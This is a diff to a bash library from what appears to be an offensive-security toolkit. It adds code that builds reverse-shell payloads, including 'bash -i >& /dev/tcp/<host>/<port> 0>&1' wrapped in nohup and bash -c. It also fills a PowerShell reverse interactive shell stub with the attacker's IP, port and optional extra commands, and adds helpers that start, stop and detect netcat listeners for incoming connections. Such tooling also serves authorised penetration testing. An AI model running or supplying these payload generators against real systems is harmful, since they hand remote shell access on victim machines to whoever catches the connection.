@@ -1,4 +1,7 @@
 #!/bin/bash
+SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
+source $SCRIPTDIR/general.sh
+source $SCRIPTDIR/network.sh
 
 get_bash_reverse_shell() {
     if [ -z "$host_port" ]; then
@@ -7,10 +10,12 @@ get_bash_reverse_shell() {
     if [ -z "$host_ip" ]; then
         host_ip=$(get_host_ip)  # Function to get the host IP address
     fi
-    if [ -z "$1" ]; then
-        reverse_shell='bash -c "bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1"'
-    else
-        reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
+    reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
+    if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
+        reverse_shell='nohup '"$reverse_shell"' &'
+    fi
+    if [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then        
+        reverse_shell="bash -c \"$reverse_shell\""        
     fi
     echo "$reverse_shell"
 }
@@ -102,8 +107,11 @@ get_powershell_interactive_shell() {
     local stty_rows=$(echo "$stty_size" | awk '{print $1}')
     local stty_cols=$(echo "$stty_size" | awk '{print $2}')
     sed -i -E 's/\{stty_rows\}/"'$stty_rows'";/g' $shell_file_name
-    sed -i -E 's/\{stty_cols\}/"'$stty_cols'";/g' $shell_file_name
+    sed -i -E 's/\{stty_cols\}/"'$stty_cols'";/g' $shell_file_name    
     reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_interactive_shell_stub.ps1 | sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g' | sed -E 's/\$\{filename\}/'$shell_file_name'/g')
+    if [[ ! -z "$powershell_additional_commands" ]]; then
+        reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$\{additional_commands\}/'$powershell_additional_commands'/g')
+    fi
     if [ "$encode_shell" == "false" ]; then
         echo "$reverse_shell"
         return 0
@@ -191,6 +199,7 @@ start_listener() {
     echo "stty -a"
     echo "stty raw -echo; fg"
     echo "export TERM=$terminal_type; export SHELL=bash; stty rows $stty_rows columns $stty_columns; reset"
+    echo "export TERM=$terminal_type; export SHELL=sh; stty rows $stty_rows columns $stty_columns; reset"
     netcat_options="-k -l -v -n -p $host_port"
     echo "Netcat options: $netcat_options"
     # for interactive
@@ -226,3 +235,53 @@ find_ready_listener_port() {
     done
     echo "$start_port"
 }
+
+stop_listener() {
+    local listener_pid=$(pgrep -f "nc -k -l -v -n -p $host_port")
+    if [[ $listener_pid ]]; then
+        kill -9 $listener_pid
+        echo "Listener on port $host_port stopped."
+    else
+        echo "No listener found on port $host_port."
+    fi
+  
+}
+
+get_listener_command() {
+    if [[ ! -z "$1" ]]; then
+        host_port=$1
+    fi
+    local interactive=""
+    if [[ ! -z "$2" ]]; then
+        interactive=$2
+    fi
+    echo $COMMONDIR/start_listener.sh "$project" "$host_port" "$interactive"
+}
+
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+
+    if [[ "$1" == "get_bash_reverse_shell" ]]; then
+        get_bash_reverse_shell "$2"
+    elif [[ "$1" == "get_powershell_reverse_shell" ]]; then
+        get_powershell_reverse_shell "$2" "$3"
+    elif [[ "$1" == "get_powershell_reverse_shell_cmd" ]]; then
+        get_powershell_reverse_shell_cmd "$2" "$3"
+    elif [[ "$1" == "get_powershell_interactive_shell" ]]; then
+        get_powershell_interactive_shell "$2" "$3"
+    elif [[ "$1" == "get_windows_binaries_powershell" ]]; then
+        get_windows_binaries_powershell "$2"
+    elif [[ "$1" == "get_nc_reverse_shell_powershell" ]]; then
+        get_nc_reverse_shell_powershell
+    elif [[ "$1" == "start_listener" ]]; then
+        start_listener
+    elif [[ "$1" == "is_listener_running" ]]; then
+        is_listener_running "$2"
+    elif [[ "$1" == "find_ready_listener_port" ]]; then
+        find_ready_listener_port
+    elif [[ "$1" == "stop_listener" ]]; then
+        stop_listener
+    else
+        echo "Unknown command: $1"
+        exit 1
+    fi
+fi
